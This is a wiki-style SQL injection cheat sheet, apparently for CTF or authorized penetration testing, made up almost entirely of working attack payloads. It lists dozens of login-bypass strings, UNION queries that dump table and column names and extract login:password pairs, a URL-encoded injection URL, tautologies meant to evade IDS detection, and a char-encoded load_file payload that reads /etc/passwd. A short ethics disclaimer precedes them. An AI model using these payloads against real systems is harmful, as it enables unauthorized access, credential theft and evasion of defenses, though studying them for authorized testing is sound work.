SQL Injection Cheatsheet
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__


'
admin' or '1'='1
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', 
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*

Get the list of tables: 
1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables;

Get the list of columns: 
1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns;

Example of getting username and password fields: 
1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;

Example with URL encoding:	
http://INSERTIPADDRESS/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns



Evade IDS detection 'OR 1=1 equivelants
---------

'OR 'john' = 'john'
'OR 'microsoft = 'micro' + 'soft'
'OR 'movies = N'movies'
'OR 'software' like ' soft%'
'OR 9 > 1
'OR 'best' > 'b'
'OR 'whatever' IN ('whatever')
'OR 3 BETWEEN 1 AND 7


Evade IDS detection with Char encoding
---------

| Description                                       | Example
| ------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Load a file in unions: string = ("/etc/passwd")   | ' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;    |
| Inject a string: ("root")                         | ' union select * from users where login = char(114,111,111,116)                       |
